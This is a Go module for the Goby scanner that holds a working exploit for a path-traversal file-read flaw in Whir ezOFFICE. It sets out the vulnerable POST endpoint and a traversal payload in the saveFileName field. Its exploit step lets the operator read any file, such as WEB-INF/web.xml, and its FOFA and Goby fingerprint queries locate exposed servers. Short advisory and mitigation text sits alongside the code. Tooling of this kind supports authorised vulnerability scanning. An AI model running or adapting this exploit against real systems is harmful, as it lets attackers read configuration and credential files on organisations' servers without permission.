package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Whir ezOFFICE convertFile file reading vulnerability",
    "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>There is a file reading vulnerability in the Wanhu ezOFFICE collaborative management platform. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "https://www.whir.net/",
    "DisclosureDate": "2023-01-02",
    "Author": "715827922@qq.com",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "2",
    "Impact": "<p>There are file reading vulnerabilities in the Wanhu ezOFFICE Collaborative Management Platform.Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.whir.net/\">https://www.whir.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/defaultroot/convertFile/text2Html.controller",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/WEB-INF/struts-config/struts-config.xml",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "com.whir.common.util",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/defaultroot/convertFile/text2Html.controller",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "saveFileName=123456/../../../..{{{filepath}}}&moduleName=html"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/WEB-INF/struts-config/struts-config.xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]+)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE convertFile 文件读取漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户 ezOFFICE 是面向政府组织及企事业单位的FlexOffice自主安全协同办公平台。</p><p>万户ezOFFICE协同管理平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.whir.net/\">https://www.whir.net/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>万户ezOFFICE协同管理平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Whir ezOFFICE convertFile file reading vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>There is a file reading vulnerability in the Wanhu ezOFFICE collaborative management platform. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.whir.net/\">https://www.whir.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There are file reading vulnerabilities in the Wanhu ezOFFICE Collaborative Management Platform.Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10839"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}